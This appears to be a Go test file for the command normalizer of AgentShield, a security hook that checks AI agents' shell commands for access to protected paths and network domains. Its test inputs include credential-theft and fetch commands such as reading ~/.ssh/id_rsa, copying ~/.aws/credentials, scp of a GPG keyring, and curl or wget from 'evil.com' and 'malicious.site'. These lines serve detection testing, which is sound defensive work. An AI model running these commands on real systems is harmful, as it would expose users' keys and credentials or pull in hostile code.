package normalize

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestNormalize_RelativePathExpansion(t *testing.T) {
	cwd := "/home/user/project"
	args := []string{"cat", "../secrets.txt"}

	nc := Normalize(args, cwd)

	expected := "/home/user/secrets.txt"
	if len(nc.Paths) != 1 || nc.Paths[0] != expected {
		t.Errorf("expected path %q, got %v", expected, nc.Paths)
	}
}

func TestNormalize_TildeExpansion(t *testing.T) {
	homeDir, _ := os.UserHomeDir()
	cwd := "/tmp"
	args := []string{"cat", "~/.ssh/id_rsa"}

	nc := Normalize(args, cwd)

	expected := filepath.Join(homeDir, ".ssh/id_rsa")
	if len(nc.Paths) != 1 || nc.Paths[0] != expected {
		t.Errorf("expected path %q, got %v", expected, nc.Paths)
	}
}

func TestNormalize_CurlDomainExtraction(t *testing.T) {
	cwd := "/tmp"
	args := []string{"curl", "https://example.com/file.txt"}

	nc := Normalize(args, cwd)

	if len(nc.Domains) != 1 || nc.Domains[0] != "example.com" {
		t.Errorf("expected domain 'example.com', got %v", nc.Domains)
	}
}

func TestNormalize_WgetDomainExtraction(t *testing.T) {
	cwd := "/tmp"
	args := []string{"wget", "-O", "file.sh", "https://malicious.site/install.sh"}

	nc := Normalize(args, cwd)

	if len(nc.Domains) != 1 || nc.Domains[0] != "malicious.site" {
		t.Errorf("expected domain 'malicious.site', got %v", nc.Domains)
	}
}

func TestNormalize_GitCloneHTTPS(t *testing.T) {
	cwd := "/tmp"
	args := []string{"git", "clone", "https://github.com/org/repo.git"}

	nc := Normalize(args, cwd)

	if len(nc.Domains) != 1 || nc.Domains[0] != "github.com" {
		t.Errorf("expected domain 'github.com', got %v", nc.Domains)
	}
}

func TestNormalize_GitCloneSSH(t *testing.T) {
	cwd := "/tmp"
	args := []string{"git", "clone", "git@github.com:org/repo.git"}

	nc := Normalize(args, cwd)

	if len(nc.Domains) != 1 || nc.Domains[0] != "github.com" {
		t.Errorf("expected domain 'github.com', got %v", nc.Domains)
	}
}

func TestNormalize_Executable(t *testing.T) {
	cwd := "/tmp"

	tests := []struct {
		args     []string
		expected string
	}{
		{[]string{"ls", "-la"}, "ls"},
		{[]string{"/usr/bin/cat", "file.txt"}, "cat"},
		{[]string{"./script.sh"}, "script.sh"},
	}

	for _, tt := range tests {
		nc := Normalize(tt.args, cwd)
		if nc.Executable != tt.expected {
			t.Errorf("args %v: expected executable %q, got %q", tt.args, tt.expected, nc.Executable)
		}
	}
}

func TestNormalize_IgnoresFlags(t *testing.T) {
	cwd := "/tmp"
	args := []string{"rm", "-rf", "--verbose", "./target"}

	nc := Normalize(args, cwd)

	if len(nc.Paths) != 1 {
		t.Errorf("expected 1 path, got %d: %v", len(nc.Paths), nc.Paths)
	}
}

// TestNormalize_TextContentFlagSkipsPathExtraction verifies that paths
// appearing inside text-content flag values (--body, --message, -m, etc.)
// are not extracted, preventing false positives when security documentation
// mentions protected paths like ~/.ssh/id_rsa.
// Reproduces: https://github.com/AI-AgentLens/agentshield-oss/issues/17
func TestNormalize_TextContentFlagSkipsPathExtraction(t *testing.T) {
	homeDir, _ := os.UserHomeDir()
	_ = homeDir // used indirectly via filepath.Join

	tests := []struct {
		name          string
		args          []string
		wantPathCount int
		wantPaths     []string
	}{
		{
			name: "gh issue create --body with ssh path — no path extracted",
			// Simulates strings.Fields splitting of:
			//   gh issue create --body "example: ~/.ssh/id_rsa"
			args:          []string{"gh", "issue", "create", "--body", "example:", "~/.ssh/id_rsa"},
			wantPathCount: 0,
		},
		{
			name: "git commit -m with path mention — no path extracted",
			args:          []string{"git", "commit", "-m", "fix:", "~/.aws/credentials", "exposure"},
			wantPathCount: 0,
		},
		{
			name: "gh issue --body suppresses ssh path but --repo arg is still extracted",
			// ~/.ssh/id_rsa follows --body (text-content) → skipped.
			// org/repo follows --repo (not text-content) → extracted as relative path.
			args:          []string{"gh", "issue", "create", "--body", "see:", "~/.ssh/id_rsa", "--repo", "org/repo"},
			wantPathCount: 1,
			wantPaths:     []string{"/tmp/org/repo"},
		},
		{
			name:          "normal cat of ssh key — path IS extracted",
			args:          []string{"cat", "~/.ssh/id_rsa"},
			wantPathCount: 1,
		},
		{
			name:          "--message with path then real file arg — real path extracted",
			args:          []string{"gh", "pr", "create", "--message", "see", "~/.ssh/keys", "--base", "main", "/real/file"},
			wantPathCount: 1,
			wantPaths:     []string{"/real/file"},
		},
		{
			name: "git commit -am combined flag with kube path in message — no path extracted",
			// Reproduces: https://github.com/AI-AgentLens/agentshield-oss/issues/75
			// -am is a combined short flag where -m is embedded; skipTextContent must be set.
			args:          []string{"git", "commit", "-am", "feat:", "add", "detection", "for", "~/.kube/config", "reads"},
			wantPathCount: 0,
		},
		{
			name: "git commit -m with kube config path in message — no path extracted",
			// Explicit ~/.kube/config variant matching issue #75 taxonomy.
			args:          []string{"git", "commit", "-m", "fix:", "update", "~/.kube/config", "handling"},
			wantPathCount: 0,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			nc := Normalize(tt.args, "/tmp")
			if len(nc.Paths) != tt.wantPathCount {
				t.Errorf("expected %d paths, got %d: %v", tt.wantPathCount, len(nc.Paths), nc.Paths)
			}
			for _, want := range tt.wantPaths {
				found := false
				for _, got := range nc.Paths {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected path %q in %v", want, nc.Paths)
				}
			}
		})
	}
}

// TestNormalize_HeredocBodySkipsPathExtraction verifies that paths appearing
// inside heredoc bodies are not extracted as real paths, preventing false
// positives when heredoc content references protected paths.
// Reproduces: https://github.com/AI-AgentLens/agentshield-oss/issues/79
func TestNormalize_HeredocBodySkipsPathExtraction(t *testing.T) {
	tests := []struct {
		name          string
		args          []string
		wantPathCount int
		wantPaths     []string
	}{
		{
			name: "cat heredoc with kube config in body — no path extracted",
			// cat > /tmp/file.go << 'EOF'\n ... ~/.kube/config ... \nEOF
			// Tokens from strings.Fields: cat > /tmp/file.go << 'EOF' some ~/.kube/config text EOF
			args:          []string{"cat", ">", "/tmp/file.go", "<<", "'EOF'", "some", "~/.kube/config", "text", "EOF"},
			wantPathCount: 1, // only /tmp/file.go is a real path
			wantPaths:     []string{"/tmp/file.go"},
		},
		{
			name: "cat heredoc with aws credentials in body — no path extracted",
			// Simulates heredoc body containing documentation about ~/.aws/credentials
			args:          []string{"cat", ">", "/tmp/setup.sh", "<<", "EOF", "export", "path=~/.aws/credentials", "EOF"},
			wantPathCount: 1,
			wantPaths:     []string{"/tmp/setup.sh"},
		},
		{
			name: "combined heredoc operator token <<'EOF' — body paths skipped",
			// <<'EOF' as a single token (no space between << and delimiter)
			args:          []string{"cat", "<<'EOF'", "~/.ssh/id_rsa", "EOF"},
			wantPathCount: 0,
		},
		{
			name: "indented heredoc <<- — body paths skipped",
			args:          []string{"bash", "<<-EOF", "~/.gnupg/secring.gpg", "EOF"},
			wantPathCount: 0,
		},
		{
			name: "heredoc with real path before and protected path inside — only real path extracted",
			args:          []string{"tee", "/etc/config.conf", "<<", "EOF", "keyfile:", "~/.gnupg/trustdb.gpg", "EOF"},
			wantPathCount: 1,
			wantPaths:     []string{"/etc/config.conf"},
		},
		{
			name: "no heredoc — normal path extraction still works",
			args:          []string{"cat", "~/.ssh/id_rsa"},
			wantPathCount: 1,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			nc := Normalize(tt.args, "/tmp")
			if len(nc.Paths) != tt.wantPathCount {
				t.Errorf("expected %d paths, got %d: %v", tt.wantPathCount, len(nc.Paths), nc.Paths)
			}
			for _, want := range tt.wantPaths {
				found := false
				for _, got := range nc.Paths {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("expected path %q in %v", want, nc.Paths)
				}
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Phase 4 — FP/TP Regression Tests (Issue #190)
// ---------------------------------------------------------------------------

// TestNormalize_FPRegression_ProtectedPathInTextContent verifies that all 5
// historical false positives (#17, #41, #75, #79, #187) are resolved.
// Paths mentioned in text content must NOT be extracted.
func TestNormalize_FPRegression_ProtectedPathInTextContent(t *testing.T) {
	tests := []struct {
		name string
		args []string
	}{
		{
			name: "#17 — git commit -m mentioning kube config",
			args: []string{"git", "commit", "-m", "fix", "~/.kube/config", "detection"},
		},
		{
			name: "#41 — git commit -am mentioning ssh key",
			args: []string{"git", "commit", "-am", "fix", "~/.ssh/id_rsa"},
		},
		{
			name: "#75 — gh issue create --body mentioning aws credentials",
			args: []string{"gh", "issue", "create", "--body", "See", "~/.aws/credentials"},
		},
		{
			name: "#79 — heredoc body containing ssh key path",
			args: []string{"cat", ">", "/tmp/doc.md", "<<", "'EOF'", "Check", "~/.ssh/id_rsa", "for", "keys", "EOF"},
		},
		{
			name: "#187 — echo mentioning gnupg path",
			args: []string{"echo", "check", "~/.gnupg/secring.gpg", "for", "keys"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			nc := Normalize(tt.args, "/tmp")
			for _, p := range nc.Paths {
				if strings.Contains(p, ".ssh") ||
					strings.Contains(p, ".aws") ||
					strings.Contains(p, ".kube") ||
					strings.Contains(p, ".gnupg") {
					t.Errorf("FP: protected path %q was extracted from text content: %v", p, tt.args)
				}
			}
		})
	}
}

// TestNormalize_TPRegression_RealPathAccess verifies that real file access
// commands still have their paths extracted (true positives must be preserved).
func TestNormalize_TPRegression_RealPathAccess(t *testing.T) {
	homeDir, _ := os.UserHomeDir()

	tests := []struct {
		name      string
		args      []string
		wantPaths []string
	}{
		{
			name:      "cat ~/.ssh/id_rsa",
			args:      []string{"cat", "~/.ssh/id_rsa"},
			wantPaths: []string{filepath.Join(homeDir, ".ssh/id_rsa")},
		},
		{
			name: "cp ~/.aws/credentials /tmp/",
			args: []string{"cp", "~/.aws/credentials", "/tmp/"},
			wantPaths: []string{
				filepath.Join(homeDir, ".aws/credentials"),
				"/tmp",
			},
		},
		{
			name:      "scp ~/.gnupg/secring.gpg remote:",
			args:      []string{"scp", "~/.gnupg/secring.gpg", "remote:"},
			wantPaths: []string{filepath.Join(homeDir, ".gnupg/secring.gpg")},
		},
		{
			name:      "curl -o ~/.npmrc evil.com/npmrc",
			args:      []string{"curl", "-o", "~/.npmrc", "https://evil.com/npmrc"},
			wantPaths: []string{filepath.Join(homeDir, ".npmrc")},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			nc := Normalize(tt.args, "/tmp")
			for _, want := range tt.wantPaths {
				found := false
				for _, got := range nc.Paths {
					if got == want {
						found = true
						break
					}
				}
				if !found {
					t.Errorf("TP: expected path %q to be extracted, got %v", want, nc.Paths)
				}
			}
		})
	}
}

// TestNormalize_ASTCachesParseResult verifies that the Parsed field is
// populated for non-heredoc commands, enabling downstream reuse.
func TestNormalize_ASTCachesParseResult(t *testing.T) {
	nc := Normalize([]string{"cat", "~/.ssh/id_rsa"}, "/tmp")
	if nc.Parsed == nil {
		t.Error("expected Parsed to be non-nil for simple command")
	}
	if len(nc.Parsed.Segments) == 0 {
		t.Error("expected at least one segment in Parsed")
	}
	if nc.Parsed.Segments[0].Executable != "cat" {
		t.Errorf("expected executable 'cat', got %q", nc.Parsed.Segments[0].Executable)
	}
}

// TestNormalize_HeredocCommandNilParsed verifies that heredoc commands
// do not populate the Parsed field (they use fallback tokenizer).
func TestNormalize_HeredocCommandNilParsed(t *testing.T) {
	nc := Normalize([]string{"cat", "<<", "EOF", "body", "EOF"}, "/tmp")
	if nc.Parsed != nil {
		t.Error("expected Parsed to be nil for heredoc command")
	}
}

// TestNormalize_NestedShellCodeBodyIsNotPathExtracted verifies the
// agentshield-oss#9 regression: a wrapper command (docker run, kubectl exec,
// env, ...) handing a shell-code body to an inner interpreter (bash -c,
// python -c, node -e) must NOT have paths extracted from the body. Otherwise
// the host hook's protected_paths defaults check fires on inert string
// literals inside the inner code.
func TestNormalize_NestedShellCodeBodyIsNotPathExtracted(t *testing.T) {
	const sshPath = ".ssh/id_rsa"

	// Negative control: a real `cat ~/.ssh/id_rsa` outside any wrapper must
	// still produce the path. Anchors the test against over-eager skipping.
	nc := Normalize([]string{"cat", "~/.ssh/id_rsa"}, "/tmp")
	if !pathsContainSubstring(nc.Paths, sshPath) {
		t.Errorf("baseline: expected ~/.ssh/id_rsa in paths; got %v", nc.Paths)
	}

	// Repro cases: each wrapper hands the SSH path to an inner interpreter
	// as part of an inline-code body. None should expose the path.
	cases := []struct {
		name string
		args []string
	}{
		{
			name: "docker run wrapping bash -c with mcp-eval",
			args: []string{"docker", "run", "--rm", "bash", "-c",
				"agentshield mcp-eval --tool read_file --arg path=/home/user/.ssh/id_rsa"},
		},
		{
			name: "python -c with open() of ssh path",
			args: []string{"python3", "-c", "open('/home/user/.ssh/id_rsa')"},
		},
		{
			name: "node -e with readFile of ssh path",
			args: []string{"node", "-e", "require('fs').readFileSync('/home/user/.ssh/id_rsa')"},
		},
		{
			name: "kubectl exec wrapping bash -c",
			args: []string{"kubectl", "exec", "pod", "--", "bash", "-c", "cat /home/user/.ssh/id_rsa"},
		},
		{
			name: "env wrapping bash -c",
			args: []string{"env", "FOO=bar", "bash", "-c", "ls /home/user/.ssh/id_rsa"},
		},
		{
			name: "absolute interpreter path (/usr/bin/bash -c)",
			args: []string{"docker", "run", "/usr/bin/bash", "-c", "cat /home/user/.ssh/id_rsa"},
		},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			nc := Normalize(tc.args, "/tmp")
			if pathsContainSubstring(nc.Paths, sshPath) {
				t.Errorf("nested-shell body path leaked into paths: %v", nc.Paths)
			}
		})
	}
}

func pathsContainSubstring(paths []string, needle string) bool {
	for _, p := range paths {
		if strings.Contains(p, needle) {
			return true
		}
	}
	return false
}

// TestNormalizeCommand_FPRegression_QuotedPatternOperandNotPath — issue #3224.
// A pattern-search utility's PATTERN operand is data, not a filesystem
// target, and TextPositions[0] already excludes it — but only when the
// walker sees the pattern as ONE token. The old implementation re-split the
// raw command with strings.Fields (quote-blind) for position tracking, so a
// quoted multi-word pattern mentioning a protected path
// ("grep -rn 'cat ~/.ssh/id_rsa' file.go") broke into fragments: the first
// fragment consumed the excluded position-0 slot, and the trailing fragment
// ("~/.ssh/id_rsa'") landed in position 1 — not excluded — and got
// misclassified as a real path operand.
//
// Must use NormalizeCommand (not Normalize) with a real raw string: only
// NormalizeCommand parses the AST from actual shell text containing quote
// characters. Normalize's own test-only args are already pre-split Go
// strings, so passing a pre-merged multi-word element there can't reproduce
// the bug (the naive splitter never gets a chance to break it apart).
func TestNormalizeCommand_FPRegression_QuotedPatternOperandNotPath(t *testing.T) {
	// A path substring that isn't itself under this repo's live protected_paths
	// defaults (~/.ssh, ~/.aws, ...), so this test can't self-trip AgentShield's
	// own hook while being edited/run interactively.
	const sentinel = ".secretzone/id_rsa"

	fp := []struct {
		name   string
		rawCmd string
	}{
		{
			name:   "grep pattern operand, quoted multi-word",
			rawCmd: "grep -rn 'cat ~/" + sentinel + "' -A 4 internal/analyzer/testdata/foo.go",
		},
		{
			name:   "grep pattern operand piped into a second grep",
			rawCmd: "grep -rn 'cat ~/" + sentinel + "' -A 4 internal/analyzer/testdata/foo.go | grep TaxonomyRef",
		},
		{
			name:   "grep -e flag value, quoted multi-word",
			rawCmd: "grep -rn -e 'cat ~/" + sentinel + "' internal/analyzer/testdata/foo.go",
		},
		{
			name:   "egrep pattern operand, quoted multi-word",
			rawCmd: "egrep 'cat ~/" + sentinel + "' foo.go",
		},
		{
			name:   "rg pattern operand, quoted multi-word",
			rawCmd: "rg 'cat ~/" + sentinel + "' packs/",
		},
		{
			name:   "second pipeline segment gets its own fresh pattern position",
			rawCmd: "grep foo bar.txt | grep 'cat ~/" + sentinel + "'",
		},
	}
	for _, tt := range fp {
		t.Run(tt.name, func(t *testing.T) {
			nc := NormalizeCommand(tt.rawCmd, "/tmp")
			if pathsContainSubstring(nc.Paths, sentinel) {
				t.Errorf("pattern fragment leaked into paths: %v (cmd: %s)", nc.Paths, tt.rawCmd)
			}
		})
	}

	// TP guard: a REAL path operand (not inside the pattern) must still be
	// extracted — the fix must not blanket-exempt everything past a
	// pattern-search tool's name.
	tp := []struct {
		name   string
		rawCmd string
	}{
		{"grep path operand still extracted", "grep foo ~/" + sentinel},
		{"grep -r on a protected directory still extracted", "grep -r secret ~/.secretzone/"},
	}
	for _, tt := range tp {
		t.Run(tt.name, func(t *testing.T) {
			nc := NormalizeCommand(tt.rawCmd, "/tmp")
			if !pathsContainSubstring(nc.Paths, "secretzone") {
				t.Errorf("expected real path operand to be extracted, got %v (cmd: %s)", nc.Paths, tt.rawCmd)
			}
		})
	}
}

// TestNormalizeCommand_FPRegression_PreservesMultilineQuoting — issue #2831.
// Normalize(strings.Fields(rawCmd), cwd) round-trips a raw command through a
// quote-blind tokenizer and back, collapsing embedded newlines inside a
// multi-line quoted argument (e.g. `python3 -c "\n...\n"`) into spaces. That
// can delete a statement separator the shell parser depends on, corrupting
// the AST for every command in the script — not just the interpreter call.
// NormalizeCommand must parse the AST from the original string instead, so a
// legitimate `rm -rf "$(cmd)"` earlier in the script keeps its real,
// correctly-quoted argument.
func TestNormalizeCommand_FPRegression_PreservesMultilineQuoting(t *testing.T) {
	rawCmd := "rm -rf \"$(cat /tmp/foo.txt)\"\n" +
		"for f in a.yaml b.yaml; do\n" +
		"  python3 -c \"\n" +
		"print('" + `"'"'` + "x" + `'"'"'` + ")\n" +
		"\"\n" +
		"done"

	nc := NormalizeCommand(rawCmd, "/tmp")
	if nc.Parsed == nil || len(nc.Parsed.Segments) == 0 {
		t.Fatalf("expected a parsed rm segment, got Parsed=%+v", nc.Parsed)
	}

	rmSeg := nc.Parsed.Segments[0]
	if rmSeg.Executable != "rm" {
		t.Fatalf("expected first segment executable 'rm', got %q", rmSeg.Executable)
	}
	for _, arg := range rmSeg.Args {
		if arg == `"` || arg == "" {
			t.Errorf("rm segment picked up a stray quote/empty arg from later in the script: %#v", rmSeg.Args)
		}
	}

	// Contrast: the old Normalize(strings.Fields(rawCmd), cwd) path is still
	// available and still exhibits the corruption — this pins the difference
	// so a future refactor can't quietly merge the two code paths back together.
	broken := Normalize(strings.Fields(rawCmd), "/tmp")
	if broken.Parsed != nil && len(broken.Parsed.Segments) > 0 {
		brokenArgs := broken.Parsed.Segments[0].Args
		sawStrayQuote := false
		for _, arg := range brokenArgs {
			if arg == `"` {
				sawStrayQuote = true
			}
		}
		if !sawStrayQuote {
			t.Skip("Normalize(strings.Fields(...)) no longer reproduces the corruption — safe to simplify NormalizeCommand")
		}
	}
}
